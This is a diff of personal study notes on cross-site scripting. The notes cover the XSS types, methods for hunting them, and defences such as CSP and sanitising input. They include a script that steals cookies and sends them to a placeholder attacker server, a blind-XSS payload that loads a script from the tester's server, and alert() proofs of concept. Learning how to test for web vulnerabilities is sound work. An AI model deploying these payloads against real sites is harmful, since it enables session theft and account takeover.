@@ -1,23 +1,24 @@
-finding the functionalities where user changes some part of the applications code, then
-changing it.
+# TODO: add a section for all HTML tags and how they could be used
 
-XSS can be used to execute actions on the victim’s behalf
+then examples of everything.
+instead of taking notes of all the payloads and all, add them to a automation and take note of the philosophy.
 
-HTML's `<script>` tags (making website interactive):
+
+[[XSS html tags]]
+# `script`
+
+
 * inline script: embedded in the html
 * loaded from separate files `<script src="URL_OF_EXTERNAL_SCRIPT"></script>`
 
-monitoring the input:
-* validating: whether it's malicious
-* sanitizing: changes part of it before further processing
+example: 
 
-Victim sends a GET request to the attacker's machine:
-`
-<script>image = new Image();
-image.src='http://attacker_server_ip/?c='+document.cookie;</script>
-`
-POC:
-`<script>alert('XSS by Vickie');</script>`
+if the attacker injects this code in victim's browser, unpon visiting, victim
+sends a GET request to the attacker's machine:
+
+```js
+<script>image = new Image();image.src='http://attacker_server_ip/?c='+document.cookie;</script>
+```
 
 ## HUNT
 
@@ -75,88 +76,64 @@ try making the victim’s browser generate a request to a server you own:
 `<script src='http://YOUR_SERVER_IP/xss'></script>`
 If you see a request to the path /xss, a blind XSS has been triggered!
 
+----
 
+# defenses against XSS
 
+* regex to ban script tags
+* CSP ([[content security policy]]) rules
+
+monitoring the input:
+* validating: whether it's malicious
+* sanitizing: changes part of it before further processing
+
+POC:
+`<script>alert('XSS by Vickie');</script>`
 
 # XSS
 
-manipulating a web site so that when it runs the attacker can compromise user's
-interaction with the app.
+taking advantage of web applications executing scripts on user's browsers.
+
+finding the functionalities where user changes some part of the applications
+code that is then executed (dynamic scripts), then changing it.
 
 allows an attacker to:
   * compromise the interactions that users have with a vulnerable application
   * circumvent the same origin policy
   * masquerade as a victim user, to carry out any actions that the user is
-    able to perform
+ able to perform
 
-types:
-  * Reflected XSS, where the malicious script comes from the current HTTP
-    request.
-  * Stored XSS, where the malicious script comes from the website's database.
-  * DOM-based XSS, where the vulnerability exists in client-side code rather
-    than server-side code.
+Occur as a result of improperly sanitized user input being embedded in the UI/ DOM.
 
-## reflected:
+XSS attacks can obtain any type of data present in the current web application.
 
-app receives an http request and includes the data in it's *immediate* response.
+## XSS types:
 
-processed in the server, returned to the user without being stored in the
-database.
-
-the page relies on the user input to construct the page, e.g. on displaying
-search results.
-
-`https://example.com/search?q=<script>alert('XSS by Vickie');</script>`
-
-`https://insecure-website.com/status?message=All+is+well.
-<p>Status: All is well.</p>`
-
-how might an attacker compromise a victim:
-  * placing links on a website controlled by attacker.
-  * sending a link in an email.
-
-### examine
-
-test every entry point within http requests:
-  * parameters
-  * URL :
-    * query string
-    * message body
-    * file path
-  * http headers
-
-submit random values:
-  * determine if it's reflected in the response
-  * it should be short and only alphanumeric to survive input validations
-
-determine the reelection context (where is it reflected):
-  * between html tags
-  * within a quoted tag attribute
-  * a JavaScript string
-  or ...
-
-test a payload:
-  * based on the context
-  * to trigger JavaScript execution
-  * keep the random value, then insert the payload before or after it, so you
-    can find it by searching the random value.
-    * `<script>alert(1)</script>abc123xyz`, `abc123xyz<script>alert(1)</script>`
+  * Stored: the malicious script is first stored in the website's database, then
+  executed. (in database)
+  
+  * Reflected: the malicious script originates from the current HTTP request
+  reflected by a server. (in request and reflected by server)
+	
+  * DOM-based: the vulnerability exists in client-side code (the browser) and is executed there. (stored and executed in the browser)
 
 ## stored:
 
-app receives data and unsafely includes it in it's *later* HTTP response.
-e.g. comments: `<p>Hello, this is my message!</p>`
+app receives data, stores it in the database and and unsafely includes it in
+it's *later* HTTP response.
 
-victim just have to visit the page with the embedded payload.
-if this is a comment:
-`<script>alert('XSS by Vickie');</script>`
-or this could be in a request:
+EX: 
+
+1. if this payload is embedded in a comment, victim just have to visit the page.
+
+`<script>alert('hacked');</script>`
+
+or it could be in a request:
 `postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net`
 
-if an attacker controlled script  is executed in the victim's browser, then they
-can typically fully compromise that user
-
-### examine
+2. if there is an XSS payload in the title of a video or article in the front page of the site, it would effect people visiting it.
+	
+### examin
 
 test all relevant *entry points* and all *exit points*
 
@@ -183,6 +160,55 @@ test for a vulnerability:
   * determine the context within the response where the stored data appears and test appropriate payloads.
 
   with the same methodology as reflected XSS.
+## reflected:
+
+app receives an http request and includes the data in it's *immediate* response.
+
+processed in the server, returned to the user without being stored in the
+database.
+
+EX:
+
+1. the page relies on the user input to construct the page, e.g. on displaying
+search results.
+
+`https://example.com/search?q=<script>alert('hacked');</script>`
+
+2. `https://insecure-website.com/status?message=All+is+well`
+results `<p>Status: All is well.</p>`
+
+EXPLOIT:
+
+* send a malicious link and somehow send it to the victim (via email, or ad for example)
+* placing links on a website controlled by attacker.
+
+### examin
+
+test every entry point within http requests:
+  * parameters
+  * URL :
+    * query string
+    * message body
+    * file path
+  * http headers
+
+submit random values:
+  * determine if it's reflected in the response
+  * it should be short and only alphanumeric to survive input validations
+
+determine the reelection context (where is it reflected):
+  * between html tags
+  * within a quoted tag attribute
+  * a JavaScript string
+  or ...
+
+test a payload:
+  * based on the context
+  * to trigger JavaScript execution
+  * keep the random value, then insert the payload before or after it, so you
+    can find it by searching the random value.
+    * `<script>alert(1)</script>abc123xyz`, `abc123xyz<script>alert(1)</script>`
+
 
 ## DOM-based cross-site scripting:
 
